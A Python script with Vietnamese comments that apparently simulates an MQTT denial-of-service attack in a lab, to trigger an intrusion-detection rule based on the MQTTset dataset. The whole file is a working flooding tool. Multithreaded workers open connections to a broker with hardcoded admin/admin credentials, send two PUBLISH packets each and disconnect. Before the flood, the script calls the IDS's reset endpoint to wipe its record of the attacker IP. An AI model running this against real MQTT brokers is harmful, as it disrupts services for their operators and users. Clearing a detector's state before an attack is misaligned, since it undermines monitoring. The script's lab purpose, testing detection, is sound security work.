
#!/usr/bin/env python3
"""
Attack 2 — DoS (Denial of Service)
Mô phỏng hành vi tấn công từ chối dịch vụ theo dataset MQTTset.
Đặc trưng nhận diện (Rule 4 trong ids_api.py):
- Tốc độ gói tin rất cao (pkt_rate > 30).
- Tỷ lệ PUBLISH / CONNECT (pub_to_conn_ratio) nằm trong khoảng 0.3 đến 3.0.
=> Phương pháp: Mở liên tục các kết nối mới, mỗi kết nối chỉ gửi đúng 2 gói PUBLISH rồi ngắt.
"""

import socket
import struct
import time
import argparse
import logging
import random
import string
import threading
import json
import urllib.request
import sys

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(threadName)s] %(message)s")
log = logging.getLogger("DoS_Attack")

def reset_ids_state(ids_ip="10.0.0.10", ids_port=5000, attacker_ip="10.0.0.99"):
    """Tự động xóa trắng bộ đệm IDS trước khi chạy (Gọi vào máy Broker)"""
    url = f"http://{ids_ip}:{ids_port}/reset"
    try:
        data = json.dumps({"ip": attacker_ip}).encode('utf-8')
        req = urllib.request.Request(url, data=data, method="POST")
        req.add_header('Content-Type', 'application/json')
        with urllib.request.urlopen(req, timeout=2.0) as response:
            log.info(f"♻️  Đã làm sạch bộ đệm IDS cho IP {attacker_ip} thành công!")
    except Exception as e:
        log.warning(f"⚠️  Không thể reset IDS API (Bỏ qua): {e}")

def encode_str(s):
    b = s.encode("utf-8")
    return struct.pack("!H", len(b)) + b

def encode_remaining_length(n):
    out = bytearray()
    while True:
        byte = n % 128
        n //= 128
        if n > 0:
            byte |= 0x80
        out.append(byte)
        if n == 0:
            break
    return bytes(out)

def build_connect_packet(client_id, username, password):
    """Tạo gói CONNECT có chứng thực"""
    fixed_header = b"\x00\x04MQTT\x04\xC2" + struct.pack("!H", 60)
    payload = encode_str(client_id) + encode_str(username) + encode_str(password)
    body = fixed_header + payload
    return b"\x10" + encode_remaining_length(len(body)) + body

def build_publish_packet():
    """Tạo 1 gói PUBLISH đơn giản"""
    garbage = ''.join(random.choices(string.ascii_letters + string.digits, k=14)).encode()
    return b'\x30\x10\x00\x0b' + garbage

def dos_worker(target_ip, target_port, iterations, thread_id):
    """
    Luồng (Thread) thực hiện DoS:
    Liên tục Connect -> Gửi 2 gói Publish -> Ngắt kết nối.
    """
    # Sinh sẵn gói tin để tối ưu CPU khi bắn phá
    pub_chunk = build_publish_packet() * 2 
    consecutive_errors = 0  # Biến đếm số lần lỗi liên tiếp
    
    for i in range(iterations):
        try:
            client_id = f"dos_bot_{thread_id}_{random.randint(1000, 9999)}"
            connect_pkt = build_connect_packet(client_id, "admin", "admin")
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            
            # Kết nối và gửi CONNECT
            s.connect((target_ip, target_port))
            s.sendall(connect_pkt)
            
            # Chờ Broker phản hồi CONNACK
            ack = s.recv(4)
            if not ack or ack[0] != 0x20 or ack[3] != 0x00:
                s.close()
                consecutive_errors += 1
                if consecutive_errors >= 5:
                    log.warning(f"  [Thread-{thread_id}] Không thể kết nối. Chắc chắn đã bị Block!")
                    break  # Thoát vòng lặp luôn
                continue
            
            # Nếu thành công, reset lại bộ đếm lỗi
            consecutive_errors = 0
            
            # Gửi đúng 2 gói PUBLISH rồi ngắt luôn
            s.sendall(pub_chunk)
            s.close()
            
        except Exception:
            # Bị block ở tầng mạng sẽ văng vào đây (Timeout)
            consecutive_errors += 1
            time.sleep(0.05)
            if consecutive_errors >= 5:
                log.warning(f"  [Thread-{thread_id}] Mạng timeout liên tục. Đã bị Ryu dập cầu dao!")
                break  # Bị chặn rồi thì nghỉ chơi, thoát vòng lặp
def main():
    parser = argparse.ArgumentParser(description="MQTT DoS Attack (High Pkt Rate, Low P2C Ratio)")
    parser.add_argument("--host", required=True, help="IP Broker")
    parser.add_argument("--port", type=int, default=1883)
    parser.add_argument("--threads", type=int, default=5, help="Số luồng tấn công")
    parser.add_argument("--iter", type=int, default=1000, help="Số lần tạo kết nối mỗi luồng")
    args = parser.parse_args()

    log.info("=" * 60)
    log.info("  💥 ATTACK 2 — MQTT DENIAL OF SERVICE (DoS)")
    log.info(f"  🎯 Target  : {args.host}:{args.port}")
    log.info(f"  🧵 Threads : {args.threads} (Mở ngắt kết nối liên tục)")
    log.info(f"  🔐 Auth    : Đã gắn cứng (User: admin)")
    log.info("=" * 60)

    # TỰ ĐỘNG LÀM SẠCH IDS TRƯỚC KHI TẤN CÔNG (Giả sử IDS đang chạy ở 10.0.0.10)
    reset_ids_state(ids_ip="10.0.0.10", attacker_ip="10.0.0.99")
    log.info("-" * 60)

    # Khởi chạy đa luồng để đẩy pkt_rate lên > 30
    threads = []
    for i in range(args.threads):
        t = threading.Thread(target=dos_worker, 
                             args=(args.host, args.port, args.iter, i),
                             name=f"DoS-{i}")
        threads.append(t)
        t.start()
        
    for t in threads:
        t.join()

    log.info("\n" + "=" * 60)
    log.info("  📊 KẾT QUẢ: Hoàn thành đợt tấn công DoS!")
    log.info("=" * 60)
    sys.exit(0)

if __name__ == "__main__":
    main()